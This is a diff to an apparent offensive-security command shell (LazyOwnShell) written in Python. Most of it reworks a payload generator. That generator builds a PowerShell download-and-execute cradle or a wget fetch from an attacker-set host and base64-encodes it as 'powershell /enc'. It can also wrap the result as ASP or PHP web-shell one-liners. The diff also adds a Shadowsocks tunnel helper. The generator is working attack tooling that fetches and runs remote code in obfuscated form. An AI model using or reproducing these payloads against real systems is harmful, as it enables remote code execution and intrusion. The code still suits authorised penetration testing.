@@ -7027,52 +7027,78 @@ class LazyOwnShell(Cmd):
 
     def do_winbase64payload(self, line):
         """
-        Creates a base64 encoded PowerShell payload specifically for Windows to execute a `.ps1` script from `lhost`.
+        Creates a base64 encoded payload specifically for Windows to execute a PowerShell command or download a file using `lhost`.
 
         1. Checks if `lhost` is set:
             - Displays an error message and exits if `lhost` is not set.
 
-        2. Checks if a file name is provided:
-            - Displays an error message and exits if no file name is provided.
+        2. Checks if a file name or command is provided:
+            - Displays an error message and exits if no file name or command is provided.
 
-        3. Constructs a PowerShell command:
-            - The command downloads and executes a `.ps1` script from `lhost` using `New-Object WebClient`.
+        3. Prompts for the type of payload:
+            - '1': Constructs a PowerShell command to download and execute a `.ps1` script from `lhost`.
+            - '2': Constructs a command to download a file using `wget`.
 
-        4. Encodes the PowerShell command:
+        4. Prompts for the output type:
+            - '1': Outputs the base64 encoded PowerShell command.
+            - '2': Outputs the base64 encoded command in an ASP format.
+            - '3': Outputs the base64 encoded command in a PHP format.
+
+        5. Encodes the command:
             - Converts the command to UTF-16LE encoding.
             - Encodes the UTF-16LE encoded command to base64.
-            - Copies the final base64 command to the clipboard using `xclip`.
+            - Copies the final base64 command to the clipboard using `copy2clip`.
 
-        :param line: The name of the `.ps1` file located in the `sessions` directory.
+        :param line: The name of the `.ps1` file or the command to be executed.
         :type line: str
         :returns: None
 
         Manual execution:
         To manually use the payload:
         - Ensure `lhost` is set to the correct IP address.
-        - Place the `.ps1` file in the `sessions` directory.
-        - Use `xclip` to copy the generated base64 command to the clipboard.
+        - Place the `.ps1` file in the `sessions` directory if using the 'ps1' payload type.
+        - Use `copy2clip` to copy the generated base64 command to the clipboard.
 
         Note: Ensure `iconv`, `base64`, and `xclip` are installed and available on your system.
         """
 
-        lhost = self.params["lhost"]
+        lhost = self.params.get("lhost")
         if not lhost:
-            print_error(f"lhost debe estàr seteado. Ej: set lhost 10.10.10.10")
+            print_error(f"lhost debe estar seteado. Ej: set lhost 10.10.10.10")
             return
         if not line:
             print_error(
-                f"Debes pasarle el nombre del archivo puesto en el directorio sessions ejemplo: {GREEN}winbase64payload payload.ps1"
+                f"Debes pasar el nombre del archivo o el comando. Ejemplo: {GREEN}winbase64payload payload.ps1"
             )
             return
 
-        os.system(
-            f"printf -n\"IEX(New-Object New.WebClient).downloadString('http://{lhost}/{line}')\"  iconv -t utf-16le | base64 -w 0 | xclip -sel clip"
-        )
-        print_msg(
-            f"Try... printf -n\"IEX(New-Object New.WebClient).downloadString('http://{lhost}/{line}')\" | iconv -t utf-16le | base64"
-        )
-        print_msg("copied to clipboard")
+        payload_type = input("    [!] Tipo de payload (1: ps1, 2: wget): ").strip()
+        if payload_type == '1':
+            command = f"IEX(New-Object Net.WebClient).downloadString('http://{lhost}/{line}')"
+        elif payload_type == '2':
+            command = f"wget http://{lhost}/{line} -o C:\\Windows\\TEMP\\{line.split('/')[-1]}"
+        else:
+            print_error(f"Tipo de payload no válido: {payload_type}")
+            return
+
+        output_type = input("    [!] Tipo de salida (1: PowerShell, 2: ASP, 3: PHP): ").strip()
+
+        # Encode command to UTF-16LE and then to base64
+        utf16_command = command.encode('utf-16le')
+        base64_command = base64.b64encode(utf16_command).decode('utf-8')
+
+        if output_type == '1':
+            final_command = f"powershell /enc {base64_command}"
+        elif output_type == '2':
+            final_command = f"<%= `powershell /enc {base64_command}` %>"
+        elif output_type == '3':
+            final_command = f"<?php echo `powershell /enc {base64_command}`; ?>"
+        else:
+            print_error(f"Tipo de salida no válido: {output_type}")
+            return
+
+        copy2clip(final_command)
+        print_msg(f"Comando base64 generado y copiado al portapapeles:\n{final_command}")
         return
 
     def do_revwin(self, line):
@@ -11978,6 +12004,77 @@ class LazyOwnShell(Cmd):
         print_msg("TightVNC password decryption completed.")
         return
 
+    def do_shadowsocks(self, line):
+        """
+        Execute the Shadowsocks tool to create a secure tunnel for network traffic.
+
+        This function allows the user to specify various parameters for configuring and running the Shadowsocks client
+        or server. It handles user input for server address, port, password, encryption method, and other options, 
+        constructs the command, and executes it.
+
+        :param line: Not used in this implementation.
+        :returns: None
+        """
+        if not is_binary_present("sslocal") and not is_binary_present("ssserver"):
+            print_warn("Shadowsocks binary not found. Installing...")
+            print_msg("Choose installation method for Shadowsocks:")
+            print_msg("1. Install using Apt")
+            print_msg("2. Install using Cargo")
+
+            choice = input("Enter choice (1 or 2): ").strip()
+
+            if choice == '1':
+                os.system("sudo apt-get install shadowsocks-libev -y")
+                print_msg("Shadowsocks installed using package manager.")
+            
+            elif choice == '2':
+                os.system("cargo install shadowsocks-rust")
+            
+            else:
+                print_error("Invalid choice. Please enter 1 or 2.")
+                return
+        if not line:
+            mode = input("    [!] Choose mode (server 1 or client 2): ").strip().lower()
+        else:
+            mode = line
+        
+        if mode == '1':
+            lport = self.params["lport"]
+            password = input("    [!] Enter the Shadowsocks password: ").strip()
+            method = input("    [!] Enter the encryption method (e.g., 'aes-256-gcm', 'aes-256-cfb', 'chacha20', etc.): ").strip() or 'aes-256-gcm'
+
+            command = (
+                f"ssserver -s '[::]:{lport}' -m '{method}' -k '{password}' -u"
+            ).strip()
+
+            print_msg(f"Generated server command: {command}")
+
+            lhost = self.params["lhost"]
+            client_command = f"sslocal -b '127.0.0.1:1080' -s '{lhost}:{lport}' -m '{method}' -k '{password}' -u --outbound-bind-interface lo0"
+            copy2clip(client_command)
+            print_msg(f"Client command copied to clipboard: {client_command}")
+
+            os.system(command)
+
+        elif mode == '2':
+            rhost = self.params["rhost"]
+            rport = self.params["rport"]
+            server_address = input("    [!] Enter the Shadowsocks server address: ").strip() or rhost
+            server_port = input("    [!] Enter the Shadowsocks server port: ").strip() or rport
+            password = input("    [!] Enter the Shadowsocks password: ").strip()
+            method = input("    [!] Enter the encryption method (e.g., 'aes-256-gcm', 'aes-256-cfb', 'chacha20', etc.): ").strip() or 'aes-256-gcm'
+
+            command = (
+                f"sslocal -b '127.0.0.1:1080' -s '{server_address}:{server_port}' -m '{method}' -k '{password}' -u --outbound-bind-interface lo0"
+            ).strip()
+
+            print_msg(f"Generated client command: {command}")
+            os.system(command)
+
+        else:
+            print_error("Invalid mode. Please enter '1' or '2'.")
+
+        
 if __name__ == "__main__":
     p = LazyOwnShell()
     p.onecmd("p")
